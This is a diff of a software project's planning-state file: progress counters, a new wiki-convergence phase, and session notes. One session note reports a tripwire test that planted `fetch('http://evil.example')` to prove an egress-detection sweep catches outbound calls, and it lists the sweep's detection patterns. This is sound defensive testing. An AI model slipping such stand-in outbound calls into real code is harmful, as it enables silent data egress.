@@ -3,15 +3,15 @@ gsd_state_version: 1.0
 milestone: v1.15.0
 milestone_name: "The Cockpit" milestone -- the UX/dial train
 status: verifying
-stopped_at: Completed 231-02-PLAN.md
-last_updated: "2026-07-19T17:30:00.000Z"
+stopped_at: Completed 231-02-PLAN.md; Phase 232 context gathered
+last_updated: "2026-07-19T19:50:25.422Z"
 last_activity: 2026-07-19
 progress:
-  total_phases: 39
+  total_phases: 40
   completed_phases: 26
   total_plans: 142
   completed_plans: 139
-  percent: 67
+  percent: 65
 ---
 
 # Project State
@@ -2035,6 +2035,17 @@ Progress: [█████████░] 92%
 
 ### Roadmap Evolution
 
+- Phase 232 added (2026-07-19): BlockNote Wiki Convergence -- registered from a
+  superpowers:brainstorming session with Jonathan (delivery lane, Room-Home-as-landing-page,
+  always-editable/accept-save-risk, and v1 scope all locked before registration). Expands
+  SEED-006 ("Mindrian Wiki Sprint -- The Visible Room", planted 2026-05-07), whose Phase
+  104/126 number reservation went stale while ~230 other phases shipped past it (Phase 126
+  is long since taken by the already-shipped install-lifecycle-harness-gaps). Depends on
+  nothing (net-new capability, not blocking on Phase 231's in-flight eureka work). Same
+  `phase.add` defect as Phases 230/231 (full description crammed into the title, Goal left
+  `[To be planned]`, Depends on defaulted to Phase 231 as a sequential-neighbor guess) --
+  corrected in place by hand immediately after, same fix pattern as the two precedents.
+
 - Phase 231 added (2026-07-19): Eureka Entity-Noise Fix -- root-caused via the
   `handoff-eureka-entity-noise-2026-07-19` debug session (a real cross-machine handoff,
   `seeds/host-runtime-research-2026-07-18` @ `0703ebe4`, fetched and verified against this
@@ -2944,8 +2955,8 @@ Progress: [█████████░] 92%
 ## Session Continuity
 
 Last activity: 2026-07-10 - Phase 198 Plan 10 tasks 1-2 executed (SPEC-7 rollback rehearsal + SPEC-6 CLI parity leg + SPEC-8 measured Plurai baseline); PAUSED at Task 3 human-verify checkpoint (two-host parity)
-Last session: 2026-07-17T21:39:44.802Z
-Stopped at: Completed 230-01-PLAN.md
+Last session: 2026-07-19T19:50:25.345Z
+Stopped at: Phase 232 context gathered
 
 **Phase 224 Plan 04 (this session):** the phase-close aggregate gate. `tests/run-all-224.sh` mirrors `run-all-222.sh` and runs 17 legs green (PASS=17 FAIL=0 SKIP=0): eight `test-224-*` proof legs (Reqs 1-4, 6), the Part 8 egress sweep (Req 5) over all five derivation surfaces (extended per SPEC to `fetch(`/http(s)/`node:http(s)`/`curl|wget`, MISSING-fails per T-224-15), the Part 9 chokepoint sweep (no direct-db in classifier, no raw INSERT INTO edges in drain/backfill, mandatory `navigation.cjs` require in graph-derivation), the Req 4 zero-deps git-diff, the three Req 7 structural gates, and three no-regression legs (run-all-222, test-218-write-safety, test-graph-derive-sweep). Req 7 `doctor --acceptance` is gated as a no-new-regression SUBSET check against the documented environmental baseline {coverage-gate, verify-release-clean-tree} (both pre-existing/dirty-tree; a NEW failure fails the leg -- run-all-217 written-reason idiom); `check-shape-declaration` runs with `--check` WITHOUT `--strict` (advisory-WARN). Tripwire-plant proof: planting `fetch('http://evil.example')` on an executable classifier line flipped Part 8 to FAILED (exit 1); reverted byte-clean. The eight `test-224-*` legs registered in `run-feynman-tests.cjs` TEST_FILES (224-VALIDATION test-infra contract); `docs/ENV-TUNING.md` documents `DERIVE_CONVERGES_FLOOR=0.55` + `DERIVE_INFORMS_FLOOR=0.45` (byte-matching the classifier header) with fixture-calibration provenance + D-04 no-guess note. Commits `58e901d0` test, `0262de57` feat, `b8bece52` docs. Req 5 + Req 7 completed; zero new deps; no em-dashes; no deviations. See 224-04-SUMMARY.md.
 
